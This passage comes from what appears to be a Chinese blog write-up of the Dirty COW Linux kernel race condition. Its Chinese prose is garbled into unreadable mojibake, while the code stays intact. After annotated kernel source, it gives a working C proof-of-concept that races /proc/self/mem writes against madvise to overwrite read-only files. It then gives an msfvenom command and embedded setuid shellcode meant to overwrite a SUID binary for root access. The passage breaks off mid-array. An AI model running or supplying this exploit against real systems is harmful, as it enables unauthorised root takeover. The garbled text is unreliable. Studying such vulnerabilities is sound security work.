&#123;<br>			<span class="hljs-comment">/* remove the page with new size */</span><br>			__tlb_remove_pte_page(tlb, pending_page);<br>			pending_page = <span class="hljs-literal">NULL</span>;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (addr != end)<br>			<span class="hljs-keyword">goto</span> again;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> addr;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h1 id="0x03ÔºöÊºèÊ¥ûÂàÜÊûê"><a href="#0x03ÔºöÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="0x03ÔºöÊºèÊ¥ûÂàÜÊûê"></a>0x03ÔºöÊºèÊ¥ûÂàÜÊûê</h1><p><del>ÁâõÈ≠îÁöÑÔºåÁªà‰∫éÂà∞Ëøô‰∫Ü</del></p>
<p>ËÆ©Êàë‰ª¨Êù•ÂõûÈ°æ‰∏Ä‰∏ãÊï¥‰∏™ÊµÅÁ®ã</p>
<ul>
<li>step ‚Ö†Ôºö<code>__get_user_pages()</code>Á¨¨‰∏ÄÊ¨°Âæ™ÁéØÔºå<code>faultin_page()</code>Âà§Êñ≠Â±û‰∫éÂÜôÂÖ•Âè™ËØªÂå∫ÂüüÁöÑÊÉÖÂÜµ, Âõ†Ê≠§‰ºöË∞ÉÁî®<code>do_cow_fault()</code>„ÄÇ<code>do_cow_fault()</code>‰ºöÂ§çÂà∂ÂéüÂßãÁöÑÊñá‰ª∂ÁºìÂ≠òÈ°µÂà∞‰∏Ä‰∏™Êñ∞È°µ‰∏≠, Âπ∂ËÆæÁΩÆ<strong>PTE</strong>Êò†Â∞ÑÂà∞Ëøô‰∏™Êñ∞È°µ, ‰ΩÜÁî±‰∫é<strong>VMA</strong>‰∏çÂèØÂÜôÂÖ•, Âõ†Ê≠§Ëøô‰∏™Êñ∞È°µÁöÑ<strong>PTE</strong>È°µÊ≤°ÊúâËÆæÁΩÆ<strong>RW</strong>Ê†áÂøó</li>
<li>step ‚Ö°Ôºö<code>__get_user_pages()</code>Á¨¨‰∫åÊ¨°Âæ™ÁéØÔºåÁî±‰∫é<code>foll_flags</code>‰∏≠Êúâ<strong>FOLL_WRITE</strong>Ê†áÂøó, ‰ΩÜÊòØÈ°µÂØπÂ∫îÁöÑ<strong>PTE</strong>Ê≤°Êúâ<strong>RW</strong>Ê†áÂøó, Âõ†Ê≠§<code>follow_page_mask()</code>Âà§Êñ≠ÊùÉÈôêÊúâÈóÆÈ¢ò,„ÄÇÂÜçÊ¨°ËøõÂÖ•<code>faultin_page()</code>Ôºå<code>faultin_page()</code>Âà§Êñ≠, Â±û‰∫éÂÜôÂÖ•Âè™ËØªÁöÑÂ∑≤Â≠òÂú®ÁöÑÈ°µÈÄ†ÊàêÁöÑÈóÆÈ¢ò, Âõ†Ê≠§‰ºöË∞ÉÁî®<code>do_wp_page()</code>Â§ÑÁêÜ„ÄÇ<code>do_wp_page()</code>ÂèëÁé∞ÂØπÂ∫îÈ°µÊòØÂè™Êúâ‰∏Ä‰∏™ÂºïÁî®ÁöÑÂåøÂêçÈ°µ,Âõ†Ê≠§‰ºöË∞ÉÁî®<code>wp_page_reuse()</code>Áõ¥Êé•ÈáçÁî®Ëøô‰∏™È°µ„ÄÇ<code>wp_page_reuse()</code>Áî±‰∫éÂØπÂ∫î<strong>VMA</strong>Âè™ËØª, Âõ†Ê≠§Âè™‰ºöÁªô<strong>PTE</strong>ËÆæÁΩÆ‰∏Ä‰∏™<strong>Dirty</strong>Ê†áÂøó, ËÄå‰∏ç‰ºöËÆæÁΩÆ<strong>RW</strong>Ê†áÂøó, ÁÑ∂ÂêéËøîÂõû‰∏Ä‰∏™<strong>VM_FAULT_WRITE</strong>Ë°®Á§∫ÂÜÖÊ†∏ÂèØ‰ª•ÂÜôÂÖ•Ëøô‰∏™È°µ„ÄÇËøîÂõûÂà∞<code>faultin_page()</code>‰∏≠, Áî±‰∫é<code>handle_mm_fault()</code>ËøîÂõû‰∫Ü<strong>VM_FAULT_WRITE</strong>, Âõ†Ê≠§‰ºöÂéªÊéâ<strong>FOLL_WRITE</strong>Ê†áÂøó, Âê´‰πâ‰∏∫: ËôΩÁÑ∂Ê≠§È°µÂØπÂ∫î<strong>PTE</strong>‰∏çÂèØÂÜôÂÖ•, ‰ΩÜÊòØÂ∑≤Áªè<strong>COW</strong>Ëøá‰∫Ü, ÂÜÖÊ†∏ÊòØÂèØ‰ª•ÂÜôÂÖ•ÁöÑ, ÂêéÁª≠<code>follow_page_mask()</code>Â∞±‰∏çË¶ÅÊ£ÄÊü•ËÉΩ‰∏çËÉΩÂÜôÂÖ•‰∫Ü„ÄÇ</li>
</ul>
<p>Ê≠§Êó∂ÔºåÊàë‰ª¨Ë∞ÉÁî®<code>madvise</code>ÔºåÂπ∂Âª∫ËÆÆÂÜÖÊ†∏ÊâßË°åÂÖ∂‰∏≠<strong>DONTNEED</strong>ÁöÑ<code>behavior</code>ÔºåÂÜÖÊ†∏Ê∏ÖÁ©∫Ê≠§<strong>PTE</strong>‰ºöÂèëÁîü‰ªÄ‰πàÊçèÔºüÔºüü§î</p>
<p>È¶ñÂÖà<code>follow_page_mask()</code>‰ºöÂõ†‰∏∫ÂØπÂ∫îPTE‰∏∫NULLËÄåÂÜçÊ¨°Â§±Ë¥•, ËøõÂÖ•<code>faultin_page()</code>Ôºå ‰ΩÜÊòØÊ≥®ÊÑè, ËøôÊ¨°ËøõÂÖ•ÁöÑÊó∂ÂÄôÊ≤°Êúâ<strong>FOLL_WRITE</strong>Ê†áÂøó„ÄÇ<code>faultin_page()</code>Âõ†Ê≠§ËÆæÁΩÆ<code>fault_flags</code>Êó∂ÊòØÊ≤°Êúâ<strong>FAULT_FALG_WRITE</strong>Ê†áÂøóÁöÑ, ‰πüÂ∞±ÊòØËØ¥<code>faultin_page()</code>ÂØπ<code>handle_mm_fault()</code>ÊâøËØ∫‰∏ç‰ºöÂÜôÂÖ•Ëøô‰∏™È°µ„ÄÇ<code>handle_mm_fault()</code>Áî±‰∫é<strong>PTE</strong>‰∏∫<strong>NONE</strong>, Âπ∂‰∏î‰∏çË¶ÅÊ±ÇÂÜôÂÖ•, Âõ†Ê≠§ÊúÄÁªà‰ºöÂàÜÊ¥æÁªô<code>do_read_fault()</code>Â§ÑÁêÜ</p>
<h3 id="do-read-fault"><a href="#do-read-fault" class="headerlink" title="do_read_fault()"></a>do_read_fault()</h3><p><code>do_read_fault()</code>‰ºöÊü•ÊâæËøôÁâá<strong>VMA</strong>Êò†Â∞ÑÁöÑÂú∞ÂùÄÁ©∫Èó¥‰∏≠, <code>address</code>ÂØπÂ∫îÁöÑÂéüÂßãÁºìÂ≠òÈ°µ, ÁÑ∂ÂêéËøîÂõûËøô‰∏™ÂéüÂßãÁºìÂ≠òÈ°µ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_read_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>;</span><br>	<span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span><br><span class="hljs-comment">	 * if page by the offset is not ready to be mapped (cold cache or</span><br><span class="hljs-comment">	 * something).</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="hljs-number">1</span>) &#123;<br>		ret = do_fault_around(fe, pgoff);<br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	ret = __do_fault(fe, pgoff, <span class="hljs-literal">NULL</span>, &amp;fault_page, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		<span class="hljs-keyword">return</span> ret;<br><br>	ret |= alloc_set_pte(fe, <span class="hljs-literal">NULL</span>, fault_page);<br>	<span class="hljs-keyword">if</span> (fe-&gt;pte)<br>		pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>	unlock_page(fault_page);<br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		put_page(fault_page);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>ËôΩÁÑ∂ÊâßË°åÁöÑÊó∂deo_read_faultÔºå‰ΩÜÊ≠§Êó∂ÁöÑwrite flagÂèØÊòØtrueÔºå‰∫éÊòØÂú®__access_remote_vm‰∏≠‰ºöË∞ÉÁî®copy_to_user_page()ÊääÁî®Êà∑Á©∫Èó¥ÁöÑÊï∞ÊçÆÂÜôÂÖ•Âõ∫ÂÆöÁöÑÈ°µÔºåÁî±Ê≠§Ê±°Êüì‰∫ÜÊñá‰ª∂ÁöÑÂéüÂßãÁºìÂ≠òÈ°µ„ÄÇ</p>
<p>‰∏ÄÊÆµÊó∂Èó¥ÂêéÔºåÂΩìËøõË°åÁ£ÅÁõòÂêåÊ≠•Êó∂ÂÜÖÊ†∏‰ºöÊääË¢´Ê±°ÊüìÁöÑÈ°µÈù¢ÂõûÂÜôÂà∞Á£ÅÁõò‰∏≠,‰øÆÊîπÂè™ËØªÊñá‰ª∂ÁöÑÂÜÖÂÆπ„ÄÇ</p>
<p>Áî±Ê≠§ÔºåÂà©Áî®ÂÆåÊàê„ÄÇ</p>
<h3 id="ÂøÖË¶Å„Å™ÂïèÈ°å"><a href="#ÂøÖË¶Å„Å™ÂïèÈ°å" class="headerlink" title="ÂøÖË¶Å„Å™ÂïèÈ°å"></a>ÂøÖË¶Å„Å™ÂïèÈ°å</h3><p>‰∏çÈöæÊÉ≥Âà∞ÔºåÂºÄÂêØ‰∏§‰∏™Á∫øÁ®ã‰æøËÉΩÂú®Á¨¨‰∫åÊ¨°<code>__get_user_pages</code>‰πãÂêéÔºåÁ¨¨‰∏âÊ¨°<code>__get_user_pages</code>‰πãÂâçÂÆåÊàêmadvise</p>
<p>‰ΩÜÊòØÊó∂Èó¥Á™óÂè£ÂæàÈáçË¶ÅÔºåËøôÊÑèÂë≥ÁùÄÊ≠§Âà©Áî®ÁöÑÊàêÂäüÁéá‰ª•ÂèäÂÆûÁî®‰ª∑ÂÄº</p>
<p>Âπ∏ËøêÁöÑÊòØÂú®ÊØèÊ¨°Âæ™ÁéØÁöÑÂºÄÂ§¥ÔºåÈÉΩ‰ºöË∞ÉÁî®cond_resched()ÂàáÊç¢Âà∞Âà´ÁöÑ‰ªªÂä°ÔºåËøô‰∏™Êó∂Èó¥Èó¥ÈöîÂÆåÂÖ®ÂèØ‰ª•Êª°Ë∂≥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br>			<span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>		cond_resched();<span class="hljs-comment">//Ë∞ÉÂ∫¶ÊâßË°åÂà´ÁöÑ‰ªªÂä°</span><br></code></pre></td></tr></table></figure>

<h1 id="0x04ÔºöÂà©Áî®-expÁºñÂÜô"><a href="#0x04ÔºöÂà©Áî®-expÁºñÂÜô" class="headerlink" title="0x04ÔºöÂà©Áî® &amp; expÁºñÂÜô"></a>0x04ÔºöÂà©Áî® &amp; expÁºñÂÜô</h1><h2 id="ÂÖàÊù•ÂÜô‰∏Ä‰∏™È™åËØÅpoc"><a href="#ÂÖàÊù•ÂÜô‰∏Ä‰∏™È™åËØÅpoc" class="headerlink" title="ÂÖàÊù•ÂÜô‰∏Ä‰∏™È™åËØÅpoc"></a>ÂÖàÊù•ÂÜô‰∏Ä‰∏™È™åËØÅpoc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>, <span class="hljs-title">fake_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">int</span> mem_fd, dest_fd, fake_fd;<br><span class="hljs-type">char</span> *fake_data;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br>                                 <br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">()</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>        write(mem_fd, fake_data, <span class="hljs-number">0x1000</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>        err_exit(<span class="hljs-string">&quot;pls usage ./exp destination_file fake_file&quot;</span>);<br>    <br><span class="hljs-comment">//open &amp; read fake file</span><br>    fake_fd = open(argv[<span class="hljs-number">2</span>], O_RDONLY);<br>    fstat(fake_fd, &amp;fake_st);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake_fd is %d\n&quot;</span>, fake_fd);<br>    fake_data = <span class="hljs-built_in">malloc</span>(fake_st.st_size);<br>    read(fake_fd, fake_data, fake_st.st_size);<br><br><span class="hljs-comment">//open dest file   </span><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>ÂèØ‰ª•ÁúãÂà∞ÂØπ‰∫éÊôÆÈÄöÁî®Êà∑Âè™ÊúâÂè™ËØªÊùÉÈôêÁöÑÊñá‰ª∂ÔºåÂ∑≤ÁªèÂèØ‰ª•Ë¶ÜÂÜô‰∫Ü</p>
<p>ÈÇ£‰πàÊé•‰∏ãÊù•Â∞±ËÉΩËøõË°å‰∏Ä‰∫õ<del>ÂòøÂòøÂòøü•µü•µü•µ</del>ÁöÑ‰∫ãÊÉÖ‰∫Ü</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306105004.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Âà©Áî®suidËøõË°åÊèêÊùÉ"><a href="#Âà©Áî®suidËøõË°åÊèêÊùÉ" class="headerlink" title="Âà©Áî®suidËøõË°åÊèêÊùÉ"></a>Âà©Áî®suidËøõË°åÊèêÊùÉ</h2><p>Ëøô‰∏™ÊâãÊ≥ïÂú®Ê∏óÈÄè‰∏≠‰πüÊòØÂæàÂ∏∏ËßÅ‰∫ÜÔºåÂú®Ê≠§Â∞±‰∏çÂÜçËµòËø∞‰∫Ü</p>
<p>Âü∫Êú¨‰∏äÂ∞±ÊòØÂà©Áî®dirtycowÊääÂÖ∑ÊúâsuidÁöÑÊñá‰ª∂ÁªôË∂äÊùÉÁØ°ÊîπÔºåÂÜôËøõÊèêÊùÉÁöÑshellcodeÔºåÂÜçÊâßË°åÂ∞±Â•Ω‰∫Ü</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><code>msf</code>ÁîüÊàê<code>shellcode</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i<br></code></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">int</span> data_len = <span class="hljs-number">149</span>;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><span class="hljs-type">int</span> dest_fd, fake_fd, mem_fd;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> attack_data[] = &#123;<br>  <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span 